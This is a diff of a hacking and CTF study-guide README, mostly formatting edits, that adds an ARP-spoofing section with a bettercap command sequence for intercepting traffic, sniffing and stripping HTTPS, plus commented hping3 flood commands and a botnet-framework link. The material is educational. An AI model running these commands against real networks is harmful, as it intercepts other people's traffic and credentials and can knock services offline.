@@ -250,8 +250,7 @@
 - Linux Basics for Hackers
 - The Linux Command Line and Shell Scripting Bible
 - Black Hat Python
-- The  Hacker PlayBook 2
-- The Hacker PlayBook 3
+- The Hacker PlayBook 2 & 3
 - Hacker Methodology Handbook
 - Gray Hat Hacking
 - Red Team Field Manual
@@ -612,6 +611,7 @@ Hackers are sorted into three hats, where their ethics and motivations behind th
 | Red Teamer | Plays the role of an adversary, attacking an organisation and providing feedback from an enemies perspective |
 
 # Linux Commands 
+Also includes other useful CLI tools and commands for Linux and Windows.
 ## cat
 cat is a Linux shell command that concatenates files and prints on the standard output. It is often used to view the content of a file. For Windows, the equivalent command is `type`.
 
@@ -811,7 +811,6 @@ du is a command that can be used to estimate file space usage. It is a part of t
 `-L` dereference all symbolic links  
 `-s` to get the total size of the directory  
 `--time` get the results with timestamps of last modification
-
 ## ncdu
 ncdu is a disk usage analyzer with an ncurses interface. It is a part of the ncdu suite.
 
@@ -1174,7 +1173,6 @@ ippsec,john,thecybermentor,liveoverflow,nahamsec,stok
 ```
 
 </details>
-
 ## sed
 sed looks for patterns we have defined in the form of regular expressions (regex) and replaces them with another pattern that we have also defined
 
@@ -1455,7 +1453,6 @@ Usage
 - `-d` for setting the depth of the spider.
 - `-m` for setting the minimum word length.
 - `-x` for setting the maximum number of words to return.
-
 ## rax2 
 rax2 comes in handy when there is a need to make base conversions between hexadecimal representations, floating point values, hex-pair strings to ASCII, binary, octal, integer and so on.
 
@@ -2226,6 +2223,40 @@ This can be made with the following command:
 
 This command will delete every dynamic entry there is. The static ones will not be deleted since we added them manually. To remove the static entries run:   
 `arp -d <IP_Address>`
+### ARP Spoofing
+ARP spoofing is a type of MITM (man-in-the-middle attack) in which a malicious actor sends falsified ARP (Address Resolution Protocol) messages over a local area network. This results in the linking of an attacker's MAC address with the IP address of a legitimate computer or server on the network.
+
+<details>
+<summary>ARP Spoofing with Bettercap</summary>
+
+```bash
+# Redirect flow
+arpspoof -i <interface> -t <target_ip> <gateway_ip>
+arpspoof -i <interface> -t <gateway_ip>
+
+# Fool victim and gateway
+echo 1 > /proc/sys/net/ipv4/ip_forward # Act as a router. 
+
+# Boot up bettercap
+bettercap -iface <interface>
+
+# Start ARP spoofing
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets <target_ip>
+arp.spoof on
+net.sniff on
+
+# Bypass HTTPS by downgrading it to HTTP
+# SSL strip, and needs change
+set net.sniff.local true
+set net.recon on
+
+# HSTS bypass
+hstshijack/hstshijack # Works for websites using HTTPS and not HSTS
+```
+
+</details>
 
 # Web Exploitation
 This section will cover the basics of web exploitation. 
@@ -3376,7 +3407,7 @@ Integer overflow is a type of software vulnerability that occurs when an integer
 Reverse-engineering is the creative process of analyzing software and understanding it without having access to the source code. It is the process by which software is deconstructed in a way that reveals its innermost details such as its structure, function and operation.
 
 ## Assembly
-Find the in-depth content for the Assembly x86-64 language [here](/More/Assembly/Readme.md) inside this repository.
+Find the in-depth content for the Assembly x86-64 language [here](/More/Assembly/Introduction.md).
 
 `TO BE ADDED`
 ## Disassemblers & Debuggers
@@ -3853,17 +3884,23 @@ There are arguably five main categories of vulnerabilities:
 **A typosquatting attack**, also known as a URL hijacking, a sting site, or a fake URL, is a type of social engineering where threat actors impersonate legitimate domains for malicious purposes such as fraud or malware spreading.
 
 #### Types of Phishing attacks
-**Spam** - unsolicited junk emails sent out in bulk to a large number of recipients. The more malicious variant of Spam is known as MalSpam.
+**Spam**   
+Unsolicited junk emails sent out in bulk to a large number of recipients. The more malicious variant of Spam is known as MalSpam.
 
-**Phishing** -  emails sent to a target(s) purporting to be from a trusted entity to lure individuals into providing sensitive information. 
+**Phishing**   
+Emails sent to a target(s) purporting to be from a trusted entity to lure individuals into providing sensitive information. 
 
-**Spear phishing** - takes phishing a step further by targeting a specific individual(s) or organization seeking sensitive information.  
+**Spear phishing**   
+Takes phishing a step further by targeting a specific individual(s) or organization seeking sensitive information.  
 
-**Whaling** - is similar to spear phishing, but it's targeted specifically to C-Level high-position individuals (CEO, CFO, etc.), and the objective is the same. 
+**Whaling**  
+Is similar to spear phishing, but it's targeted specifically to C-Level high-position individuals (CEO, CFO, etc.), and the objective is the same. 
 
-**Smishing** - takes phishing to mobile devices by targeting mobile users with specially crafted text messages. 
+**Smishing**   
+Takes phishing to mobile devices by targeting mobile users with specially crafted text messages. 
 
-**Vishing** - is similar to smishing, but instead of using text messages for the social engineering attack, the attacks are based on voice calls. 
+**Vishing**   
+Is similar to smishing, but instead of using text messages for the social engineering attack, the attacks are based on voice calls. 
 
 #### Analyze/identify
 1. Open Email
@@ -3888,6 +3925,10 @@ Expand shortened links with this [tool](https://www.expandurl.net).
 hping -S -V --flood <IP>
 masscan -p80,443,22 <IP>/24 --rate=1000
 amass enum -d <domain>
+
+ICMP: sudo hping3 -1 --flood <ip>
+SYN: sudo hping3 -d 200 -p 80 -S --flood <ip>
+https://byob.dev/guide
  -->
 
 ## Misconfigurations
